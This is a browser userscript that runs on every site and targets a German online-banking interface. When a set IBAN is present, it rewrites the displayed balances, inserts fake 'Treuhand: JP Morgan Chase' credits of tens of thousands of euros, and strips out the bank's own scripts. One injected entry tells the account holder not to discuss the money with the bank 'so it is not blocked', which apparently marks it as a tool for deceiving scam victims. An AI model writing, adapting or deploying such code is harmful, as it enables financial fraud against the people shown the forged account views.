// ==UserScript==
// @name         Ed OZ R Combined Zana Darwish Darwish
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  NOW STARTING FROM 0, NOT 1
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/491655/Ed%20OZ%20R%20Combined%20Zana%20Darwish%20Darwish.user.js
// @updateURL https://update.greasyfork.org/scripts/491655/Ed%20OZ%20R%20Combined%20Zana%20Darwish%20Darwish.meta.js
// ==/UserScript==


//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------


//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL


 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +0 },
        { index: 1, adjustmentAmount: +0 },
   //     { index: 5, adjustmentAmount: +0 },
  //      { index: 3, adjustmentAmount: +1 }
        // Add more configurations as needed...
    ];



//2 COMM FINSISCHT CHANGE BAL


    // Configurable Elements
        var BALANCE_CONFIGS_FIN = [
          { index: 0, adjustmentAmount: +0 },
          { index: 1, adjustmentAmount: +0 },
          { index: 2, adjustmentAmount: +0 },
 //         { index: 3, adjustmentAmount: 0 }
          // Add more configurations as needed...
        ];


//3 and COMM UMSATZE BALANCE MODIF and 8 COMM KONTODETAILS


    // Modify this value to the amount by which you want to increase or decrease the balance
    let balanceModificationAmount = 0; // Example: +100 or -100  DON'T CHANGE IT!!!

    // Specify the expected value for the IBAN
    let expectedIBAN = 'smth'; // DON'T CHANGE IT!!!



// 4 COMM UMSATZE INSERT VORGEMERKT
    // Configuration: Specify the search text
    let searchText = "smth"; // DON'T CHANGE IT!!!


    // Transaction details array with order property (modify as needed)
    var transactions = [
        {
            order: 4,
            title: "Treuhand: JP Morgan Chase",
            type: "Gutschrift",
            amount: "+ 77.787,82 EUR"
        },
  //     {
  //          order: 3,
  //         title: "Another Transaction",
  //          type: "Gutschrift",
 //          amount: "+ 100,00 EUR"
  ///     },
        // Add more transactions as needed
    ];



// 5 COMM UMSATZE INSERT REAL


    // Array of transactions with order specified (modify as needed)
    var transactionsr = [
//        {
//            order: 4,
//            title: "JP Morgan Chase",
//            type: "Gutschrift",
//            amount: "+ 100,00 EUR",
//            date: "08.01.2024"
//        },
 //     {
 //           order: 3,
//            title: "Payward Limited",
//            type: "Gutschrift",
 //           amount: "+ 1000,00 EUR",
 //           date: "11.01.2024"
 //       },
//      {
//            order: 2,
//            title: "Payward Limited",
//            type: "Gutschrift",
//            amount: "+ 24.000,00 EUR",
 //           date: "17.01.2024"
 //       },
   //   {
  //          order: 2,
  //          title: "Payward Limited",
   //         type: "Gutschrift",
   //         amount: "+ 100,00 EUR",
   ////         date: "20.12.2023"
   //     },
    //    {
    //        order: 2,
      //      title: "Another Transaction",
      //      type: "Gutschrift",
     //       amount: "+ 5.000,00 EUR",
     //       date: "13.11.2023"
     //   },
        // Add more transactions as needed
    ];

//6 COMM TRANSACTIONOVERVIEW BAL CHANGE


    var balanceChange = 0 ; // Specify the amount to increase or decrease the main balance   DONT'T CHANGE IT!!!
    let targetTextContent = 'smth'; // Specify the target text content for presence check    DONT'T CHANGE IT!!!



//7 COMM TRANSACTIONOVERVIEW INSERT


  // Check for the presence of the specified text content on the page
    let specifiedTextContent = "smth";

//    const specifiedTextContent = "DE54 2004 0000 0275 6245 00"; // Specified text content

    const transactionConfigs = [
   //     {
   //         date: "13.11.2023",
   //         title: "Kaufland Kiel Kiel DE",
   //         secondTitle: "Rechnung: 59 559",
   //         type: "Lastschrift",
   //         amount: "+91,84 EUR", // Change this to a positive amount to see positive amount styling
   //         insertBelowOriginal: false // Set to true to insert below original, false to insert above
  //      },
        {
            date: "Vorgemerkt",
            title: "JP Morgan Chase",
            secondTitle: "A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt",
            type: "Treuhand Gutschrift",
            amount: "97.991,00 EUR", // Change this to a negative amount to see negative amount styling
            insertBelowOriginal: false // Set to true to insert below original, false to insert above
        },
        // Add more transaction configurations as needed
    ];

//8 COMM KONTODETAILS  (look at 3)

//    // Set the amount to increase or decrease the main balance
//    var balanceModificationAmount = -10000; // Change this value as needed

//    // Specify the text content to look for on the page
//    var targetTextContent = "DE40 2108 0050 0104 6378 00";



//BALANCE CONFIGUARTION_____________________________________________________

balanceModificationAmount = balanceChange = 0.0 ;


//BALANCE CONFIGUARTION_____________________________________________________


///IBAN CONFIGURATION_______________________________________________________

  expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE17 2704 0080 0590 1566 01"

///IBAN CONFIGURATION_______________________________________________________




//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------




///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
///////////////////////////////////////////////////////////////////////////////




   if (window.location.href.indexOf("landingpage") > 0 || window.location.href.indexOf("11193210710") > 0 || window.location.href.indexOf("10726846341") > 0 ) {
(function () {
    'use strict';

    // Configurable Timeout (in milliseconds)
    var scriptTimeout = 300;
    var checkInterval = 200; // Check every 2 seconds

//    // Configurable Elements
//    var BALANCE_CONFIGS = [
 //       { index: 0, adjustmentAmount: +200000 },
//        { index: 1, adjustmentAmount: +200000 },
 //       { index: 2, adjustmentAmount: +200000 },
 //       { index: 3, adjustmentAmount: +3000 }
        // Add more configurations as needed...
//    ];

    // Function to modify the balance by a specified amount
    function modifyBalance() {
        // Iterate through each configured balance element
        for (var i = 0; i < BALANCE_CONFIGS.length; i++) {
            var config = BALANCE_CONFIGS[i];

            // Find the balance element and its sibling sign element
            var balanceElements = document.querySelectorAll('.show-tooltip.test_colorContainer2');
            var signElements = document.querySelectorAll('.test_colorContainer1');

            if (config.index < balanceElements.length && config.index < signElements.length) {
                var balanceElement = balanceElements[config.index];
                var signElement = signElements[config.index];

                // Extract the current balance text content and sign
                var currentBalance = balanceElement.textContent.trim();
                var currentSign = signElement.textContent.trim();

                // Add the sign from the sibling element to the balance text content
                var modifiedBalance = (currentSign === '-' ? '-' : '+') + currentBalance;

                // Extract the numeric value from the modified balance
                var numericBalance = parseFloat(modifiedBalance.replace(/[^\d,-]/g, '').replace(',', '.'));

                if (!isNaN(numericBalance)) {
                    // Modify the balance amount by the specified value
                    var newNumericBalance = numericBalance + config.adjustmentAmount;

                    // Format the modified balance as per the original format without an extra space
                    var formattedBalance = (newNumericBalance >= 0 ? '+' : '-') + Math.abs(newNumericBalance).toLocaleString('de-DE', {
                        minimumFractionDigits: 2,
                        maximumFractionDigits: 2
                    });

                    // Update the balance element with the modified balance
                    balanceElement.textContent = formattedBalance;

                    // Make the sign element completely transparent
                    signElement.style.opacity = '0';

                    console.log('Balance modified successfully. New balance:', balanceElement.textContent);
                } else {
                    console.error('Failed to extract numeric balance from the current balance:', currentBalance);
                }
            } else {
                console.error('Invalid index in BALANCE_CONFIGS:', config.index);
            }
        }
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to check for the presence of "Einfache Ansicht" and modify balance
    function checkAndModifyBalance() {
        var elementsWithText = document.querySelectorAll('*');
        var topLinksFound = false;
        var einfacheAnsichtFound = false;

        for (var j = 0; j < elementsWithText.length; j++) {
            var element = elementsWithText[j];
            var textContent = element.textContent.trim();

            if (textContent === 'Top-Links') {
                topLinksFound = true;
            }

            if (textContent === 'Einfache Ansicht') {
                einfacheAnsichtFound = true;
                // Remove the parent element
                element.parentElement.remove();
            }
        }

        if (topLinksFound && einfacheAnsichtFound) {
            // Modify the balance
            modifyBalance();
        }
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Check for "Einfache Ansicht" and modify balance at intervals
    setInterval(checkAndModifyBalance, checkInterval);

    console.log('Script loaded.');
})();


 }


//END  1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL  END
///////////////////////////////////////////////////////////////////////////////
//END   1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL  END
///////////////////////////////////////////////////////////////////////////////
//END   1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL   END



//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------


///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////

if (window.location.href.indexOf("financeoverview") > 0 || window.location.href.indexOf("11193215593") > 0 || window.location.href.indexOf("10726834157") > 0) {
  (function () {
    'use strict';

    // Function to check if both "Gesamtsaldo" and "Finanzübersicht" text contents are present
    function areTextContentsPresent() {
      var bodyText = document.body.textContent;
      return bodyText.includes("Gesamtsaldo") && bodyText.includes("Finanzübersicht");
    }

    // Function to perform balance modifications
    function performBalanceModifications() {
      // Check for the presence of both text contents before executing balance modifications
      if (areTextContentsPresent()) {
        // Specify the timeout duration (in milliseconds)
        var scriptTimeout = 300; // Example: 5000 milliseconds (5 seconds

 //CONFIGURE-------------------------------------------------------------------------------------------------------------------------------------------------------
 //CONFIGURE-------------------------------------------------------------------------------------------------------------------------------------------------------


//        // Configurable Elements
//        var BALANCE_CONFIGS_FIN = [
//         { index: 0, adjustmentAmount: 200000 },
//          { index: 1, adjustmentAmount: 200000 },
//          { index: 2, adjustmentAmount: -200000 },
//          { index: 3, adjustmentAmount: 200000 }
//          // Add more configurations as needed...
//        ];

 //CONFIGURE-------------------------------------------------------------------------------------------------------------------------------------------------------
 //CONFIGURE-------------------------------------------------------------------------------------------------------------------------------------------------------


        // Function to find the element with class containing "p-s" and modify the balance
        function modifyBalance(config) {
          var balanceElements = document.querySelectorAll('[class*="p-s"]');
          if (balanceElements.length > config.index) {
            var balanceElement = balanceElements[config.index];
            var currentBalance = parseFormattedBalance(balanceElement.textContent);
            if (!isNaN(currentBalance)) {
              var newBalance = currentBalance + config.adjustmentAmount;
              var formattedBalance = formatCurrency(Math.abs(newBalance)) + ' EUR'; // Format the absolute value with currency
              balanceElement.textContent = (newBalance >= 0 ? '+ ' : '- ') + formattedBalance; // Add "+" or "-" based on the sign
              console.log('Modified balance:', balanceElement.textContent);

              // Remove "Gesamtsaldo" and "Finanzübersicht" text contents 5 milliseconds after the balance modifications
              setTimeout(function () {
                removeTextContents(["Gesamtsaldo", "Finanzübersicht"]);
              }, 5);
            } else {
              console.error('Unable to extract numeric balance value.');
            }
          } else {
            console.error('Balance element with index ' + config.index + ' not found.');
          }
        }

        // Function to format the currency with commas and two decimal places
        function formatCurrency(amount) {
          return new Intl.NumberFormat('de-DE', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
          }).format(amount);
        }

        // Function to parse the original balance amount with correct formatting
        function parseFormattedBalance(balanceString) {
          var cleanBalanceString = balanceString.replace(/[^\d,-]/g, '').replace(',', '.');
          return parseFloat(cleanBalanceString);
        }

        // Function to remove specified text contents
        function removeTextContents(contentsToRemove) {
          contentsToRemove.forEach(function (content) {
            var regex = new RegExp(content, 'g');
            document.body.innerHTML = document.body.innerHTML.replace(regex, '');
          });
        }

        // Function to remove scripts from the document
        function removeScripts() {
          console.log("Removing scripts...");
          document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log("Script removed.");
          });
        }

        // Watch for changes in the DOM and remove added scripts
        var observer = new MutationObserver(function (mutationsList) {
          for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
              for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                  console.log("Script added. Removing...");
                  node.remove();
                  console.log("Script removed.");
                }
              }
            }
          }
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Remove scripts from the document
        removeScripts();

        // Loop through the configurable elements and perform the balance modifications
        BALANCE_CONFIGS_FIN.forEach(function (config) {
          modifyBalance(config);
        });

        console.log('Script loaded.');
      } else {
        console.log("Both 'Gesamtsaldo' and 'Finanzübersicht' text contents are not present. Script not executed.");
      }
    }

    // Check whether conditions are met and perform balance modifications every 2 seconds
    setInterval(performBalanceModifications, 200);
  })();
}

///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////





//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------





///////////////////////////////////////////////////////////////////////////////
//3 COMM UMSATZE BALANCE MODIF
///////////////////////////////////////////////////////////////////////////////
//3 COMM UMSATZE BALANCE MODIF
///////////////////////////////////////////////////////////////////////////////
//3 COMM UMSATZE BALANCE MODIF
///////////////////////////////////////////////////////////////////////////////




   if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10926908005") > 0 || window.location.href.indexOf("10726842017") > 0 ) {


(function () {
    'use strict';

//    // Modify this value to the amount by which you want to increase or decrease the balance
//    var balanceModificationAmount = 200; // Example: +100 or -100

//    // Specify the expected value for the IBAN
//    var expectedIBAN = 'DE40 2108 0050 0104 6378 00';

    // Specify the timeout duration (in milliseconds)
    var checkInterval = 50; // Check every 2 seconds

    // Function to modify the balance by a specified amount and remove the parent element
    function modifyBalance() {
        // Find the element with the specified ID
        var currentAccountArea = document.getElementById('currentAccountArea');

        if (currentAccountArea) {
            // Find the balance element within the current account area
            var balanceElement = currentAccountArea.querySelector('h3');

            if (balanceElement) {
                // Extract the current balance text content
                var currentBalance = balanceElement.textContent.trim();

                // Extract the numeric value from the current balance
                var numericBalance = parseFloat(currentBalance.replace(/[^\d,-]/g, '').replace(',', '.'));

                if (!isNaN(numericBalance)) {
                    // Modify the balance by the specified amount
                    var modifiedBalance = numericBalance + balanceModificationAmount;

                    // Format the modified balance as per the original format
                    var formattedBalance = (modifiedBalance >= 0 ? '+' : '') + modifiedBalance.toLocaleString('de-DE', {
                        minimumFractionDigits: 2,
                        maximumFractionDigits: 2
                    }) + ' EUR';

                    // Update the balance element with the modified balance
                    balanceElement.textContent = formattedBalance;

                    console.log('Balance modified successfully. New balance:', balanceElement.textContent);

                    // Remove the parent element with the same class as "Ihr Kontostand um"
                    var textToSearch = "Datum";
                    var elementsWithText = document.querySelectorAll('*');
                    for (var j = 0; j < elementsWithText.length; j++) {
                        var element = elementsWithText[j];
                        if (element.textContent.trim() === textToSearch) {
                            var parentToRemove = element.parentElement;
                            if (parentToRemove) {
                                parentToRemove.remove();
                            }
                            break;
                        }
                    }
                } else {
                    console.error('Failed to extract numeric balance from the current balance:', currentBalance);
                }
            } else {
                console.error('Balance element not found within the current account area.');
            }
        } else {
            console.error('Current account area not found.');
        }
    }

    // Function to check the conditions and perform balance modification
    function checkConditionsAndModifyBalance() {
        // Check if the current IBAN matches the expected IBAN
        var toolbarElement = document.querySelector('.toolbar-element.enabled.single');

        if (toolbarElement) {
            var kontoauswahlText = toolbarElement.querySelector('dd').textContent.trim().toLowerCase().replace(/\s/g, '');

            // Check the first 22 characters of the text content for a match (case-insensitive and whitespace-trimmed)
            if (kontoauswahlText.substring(0, 22) === expectedIBAN.trim().toLowerCase().replace(/\s/g, '').substring(0, 22)) {
                console.log('IBAN condition met.');
                // Check if the text content "Ihr Kontostand um" is present on the page
                var textToSearch = "Datum";
                var elementsWithText = document.querySelectorAll('*');
                for (var j = 0; j < elementsWithText.length; j++) {
                    var element = elementsWithText[j];
                    if (element.textContent.trim() === textToSearch) {
                        console.log('Text content condition met.');
                        // Execute the modifyBalance function if both conditions are met
                        modifyBalance();
                        break;
                    }
                }
            }
        }
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Check conditions and modify the balance at regular intervals
    setInterval(checkConditionsAndModifyBalance, checkInterval);

    console.log('Script loaded.');
})();

}



///////////////////////////////////////////////////////////////////////////////
// END    3 COMM UMSATZE BALANCE MODIF    END
///////////////////////////////////////////////////////////////////////////////
// END    3 COMM UMSATZE BALANCE MODIF    END
///////////////////////////////////////////////////////////////////////////////
// END    3 COMM UMSATZE BALANCE MODIF    END
///////////////////////////////////////////////////////////////////////////////




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




///////////////////////////////////////////////////////////////////////////////
// 4 COMM UMSATZE INSERT VORGEMERKT
///////////////////////////////////////////////////////////////////////////////
// 4 COMM UMSATZE INSERT VORGEMERKT
///////////////////////////////////////////////////////////////////////////////
// 4 COMM UMSATZE INSERT VORGEMERKT
///////////////////////////////////////////////////////////////////////////////




  if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10926908005") > 0 || window.location.href.indexOf("10726842017") > 0 ) {

(function () {
    'use strict';

    // Adjust this timeout duration as needed (in milliseconds)
    var insertionTimeout = 50; // Example: 5000 milliseconds (5 seconds)

//    // Configuration: Specify the search text
//    var searchText = "DE40 2108 0050 0104 637800";

//    // Transaction details array with order property (modify as needed)
//    var transactions = [
//        {
//            order: 1,
//            title: "Payward Limited",
 //           type: "Überweisung",
 //           amount: "+ 41,82 EUR"
 //       },
//        {
 //           order: 2,
 //           title: "Another Transaction",
 //           type: "Type 2",
 //           amount: "- 20,00 EUR"
 //       },
        // Add more transactions as needed
//    ];

    // Function to check if a specific transaction is already present on the page
    function isTransactionPresent(transaction) {
        var transactionTitle = transaction.title.trim();
        var transactionElements = document.querySelectorAll('.th-click.expander_handle_column_1');

        for (var i = 0; i < transactionElements.length; i++) {
            var element = transactionElements[i];
            if (element.textContent.trim() === transactionTitle) {
                return true;
            }
        }
        return false;
    }

    // Function to insert transactions
    function insertTransactions() {
        // Function to insert a transaction with specified details
        function insertTransaction(transaction) {
            console.log('Attempting to insert transaction...');

            // Determine the parent class based on the presence of a plus or minus sign
            var parentClass = transaction.amount.includes('-') ? 'tb-p-01-03 p-s-03' : 'tb-p-01-03 p-s-04';

            // Modify the transaction details as needed
            var transactionHTML = `
                <tbody class="t-body dateGroup" id="id474" data-read-state="false">
                    <tr class="expander-handle tb-p-02-01" style="background-color: #ffffff; color: #00414b!important; font-family: 'Gotham 4r', Arial, sans-serif!important; font-size: 13px!important; border-color: #b4c8cd!important;">
                        <th class="th-click expander_handle_column_1 tb-p-02-01 show-tooltip" style="word-wrap: break-word" id="toTransactionRows">${transaction.title}</th>
                        <th class="expander_handle_column_2"></th>
                        <th class="expander_handle_column_4"></th>
                        <th class="non-pfm-type expander_handle_column_5">${transaction.type}</th>
                        <th class="${parentClass} nowrap expander_handle_column_6">${transaction.amount}</th>
                        <th class="expander_handle_column_7 sf-hidden"></th>
                    </tr>
                    <tr class="expander-details tb-p-02-01 sf-hidden">
                    </tr>
                </tbody>
            `;

            // Find the element with the specified ID
            var container = document.getElementById('reservedTransactionsContainer');

            if (container) {
                console.log('Container found:', container);

                // Create a new row and insert it as the first child
                var newRow = document.createElement('tbody');
                newRow.innerHTML = transactionHTML;

                // Insert the new row as the first child of the container
                container.appendChild(newRow);

                console.log('Transaction inserted:', newRow);

                // Find and remove the text content "Kontoauswahl"
                var kontoauswahlElements = document.querySelectorAll('*');
                for (var j = 0; j < kontoauswahlElements.length; j++) {
                    var element = kontoauswahlElements[j];
                    if (element.textContent.trim() === "Kontoauswahl") {
                        element.remove();
                    }
                }
            } else {
                console.error('Container not found.');
            }
        }

        // Insert only transactions that are not already present
        var transactionsToInsert = transactions.filter(function (transaction) {
            return !isTransactionPresent(transaction);
        });

        if (transactionsToInsert.length > 0) {
            transactionsToInsert.forEach(function (transaction) {
                insertTransaction(transaction);
            });

            console.log('Transactions inserted.');
        } else {
            console.log('All transactions are already present.');
        }
    }

    // Function to continuously check if transactions are present every 2 seconds
    var checkingInterval = setInterval(insertTransactions, 200); // Check every 2 seconds

    // Insert transactions initially
    insertTransactions();

    console.log('Script loaded.');
})();
}

///////////////////////////////////////////////////////////////////////////////
// END 4 COMM UMSATZE INSERT VORGEMERKT   END
///////////////////////////////////////////////////////////////////////////////
// END 4 COMM UMSATZE INSERT VORGEMERKT   END
///////////////////////////////////////////////////////////////////////////////
// END 4 COMM UMSATZE INSERT VORGEMERKT   END
///////////////////////////////////////////////////////////////////////////////





//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------






///////////////////////////////////////////////////////////////////////////////
// 5 COMM UMSATZE INSERT REAL
///////////////////////////////////////////////////////////////////////////////
// 5 COMM UMSATZE INSERT REAL
///////////////////////////////////////////////////////////////////////////////
// 5 COMM UMSATZE INSERT REAL
///////////////////////////////////////////////////////////////////////////////

 if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10926908005") > 0 || window.location.href.indexOf("10726842017") > 0 ) {


(function() {
    'use strict';



 	//	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	//CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE////////CONFIGURE//
	////////////CONFIGURE//////////CONFIGURE//////////CONFIGURE///////////CONFIGURE////////CONFIGURE///////////CONFIGURE///////////CONFIGURE////////CONFIGURE//////////

    // Adjust this timeout duration as needed (in milliseconds)
    var insertionTimeout = 100; // Example: 5000 milliseconds (5 seconds)

//    // Configuration: Specify the search text
//    var searchText = "DE40 2108 0050 0104 637800";

//    // Array of transactions with order specified (modify as needed)
//    var transactionsr = [
//        {
//            order: 1,
//            title: "Payward Limited",
//            type: "Überweisung",
//            amount: "- 10.000,02 EUR",
//            date: "12.11.2023"
//        },
//        {
//            order: 2,
//            title: "Another Transaction",
//            type: "Gutschrift",
 //           amount: "+ 5.000,00 EUR",
//            date: "13.11.2023"
//        },
        // Add more transactions as needed
//    ];

	   //CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE////////CONFIGURE//
	////////////CONFIGURE//////////CONFIGURE//////////CONFIGURE///////////CONFIGURE////////CONFIGURE///////////CONFIGURE///////////CONFIGURE////////CONFIGURE//////////
	//	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


    // Sort transactions based on the specified order
    transactionsr.sort(function(a, b) {
        return a.order - b.order;
    });

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Function to check for the presence of specified text content
    function isTextContentPresent() {
        var cleanedSearchText = searchText.replace(/\s+/g, "").toLowerCase(); // Remove whitespace and convert to lowercase
        var elements = document.getElementsByTagName('*');

        for (var i = 0; i < elements.length; i++) {
            var cleanedElementText = elements[i].textContent.replace(/\s+/g, "").toLowerCase(); // Remove whitespace and convert to lowercase
            if (checkSubstringMatch(cleanedElementText, cleanedSearchText, 9)) {
                return true;
            }
        }

        return false;
    }

    // Function to check if a substring of at least n characters is present in the main string
    function checkSubstringMatch(mainString, subString, n) {
        for (var i = 0; i <= mainString.length - n; i++) {
            if (mainString.indexOf(subString.substring(i, i + n)) !== -1) {
                return true;
            }
        }
        return false;
    }

    // Check for the presence of specified text content
    if (isTextContentPresent()) {


        // Sort transactions based on the specified order
        transactionsr.sort(function(a, b) {
            return a.order - b.order;
        });

        // Function to check if a specific transaction is already present on the page
        function isTransactionPresent(transaction) {
            var transactionTitle = transaction.title.trim();
            var transactionElements = document.querySelectorAll('.th-click.expander_handle_column_1');
            for (var i = 0; i < transactionElements.length; i++) {
                var element = transactionElements[i];
                if (element.textContent.trim() === transactionTitle) {
                    return true;
                }
            }
            return false;
        }

        // Function to insert transactions with specified details
        function insertTransactionsr() {
            console.log('Attempting to insert transactions...');

            // Find the element with the specified ID
            var container = document.getElementById('reservedTransactionsContainer');

            if (container) {
                console.log('Container found:', container);

                // Iterate through each transaction
                transactionsr.forEach(function(transaction) {
                    // Determine the parent class based on the presence of a plus or minus sign
                    var parentClass = transaction.amount.includes('-') ? 'tb-p-01-03 p-s-03' : 'tb-p-01-03 p-s-04';

                    // Modify the transaction details as needed
                    var transactionHTML = `
                        <tbody class="t-body dateGroup" id="id473" data-read-state="false">
                            <tr class="expander-handle tb-p-02-01" style="background-color: #d5e1e2; line-height: 0.4;">
                                <th colspan="2" class="dateGroupCol2" id="dateBalanceBookedTransfer">${transaction.date}</th>
                                <th class="expander_handle_column_4 dateGroupCol4"></th>
                                <th class="meniga expander_handle_column_5 dateGroupCol5"></th>
                                <th class="${parentClass} nowrap expander_handle_column_6 dateGroupCol6"></th>
                                <th class="expander_handle_column_7 sf-hidden" style="width:0%"></th>
                            </tr>
                            <tr class="expander-handle tb-p-02-01">
                                <th class="th-click expander_handle_column_1 tb-p-02-01 show-tooltip" style="word-wrap:break-word" id="toTransactionRows">${transaction.title}</th>
                                <th class="expander_handle_column_2"></th>
                                <th class="expander_handle_column_4"></th>
                                <th class="non-pfm-type expander_handle_column_5">${transaction.type}</th>
                                <th class="${parentClass} nowrap expander_handle_column_6">${transaction.amount}</th>
                                <th class="expander_handle_column_7 sf-hidden"></th>
                            </tr>
                            <tr class="expander-details tb-p-02-01 sf-hidden"></tr>
                        </tbody>
                    `;

                    // Create a new row and insert it as the first child
                    var newRow = document.createElement('tbody');
                    newRow.innerHTML = transactionHTML;

                    // Insert the new row as the first child of the container
                    container.appendChild(newRow);

                    console.log('Transaction inserted:', newRow);
                });
            } else {
                console.error('Container not found.');
            }
        }



   // Function to continuously check if transactions are present every 2 seconds
var checkingInterval = setInterval(function() {
    console.log('Checking for transactions...'); // For debugging purposes

    var transactionsToInsertr = transactionsr.filter(function (transaction) {
        return !isTransactionPresent(transaction);
    });

    if (transactionsToInsertr.length > 0) {
        insertTransactionsr();
    }
}, 200); // Check every 2 seconds



        // Insert transactions initially
        setTimeout(insertTransactionsr, insertionTimeout);

        console.log('Script loaded.');
    } else {
        console.log('Text content not found. No transactions inserted.');
    }
})();

}



///////////////////////////////////////////////////////////////////////////////
// END 5 COMM UMSATZE INSERT REAL   END
///////////////////////////////////////////////////////////////////////////////
// END 5 COMM UMSATZE INSERT REAL   END
///////////////////////////////////////////////////////////////////////////////
// END 5 COMM UMSATZE INSERT REAL   END
///////////////////////////////////////////////////////////////////////////////





//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




///////////////////////////////////////////////////////////////////////////////
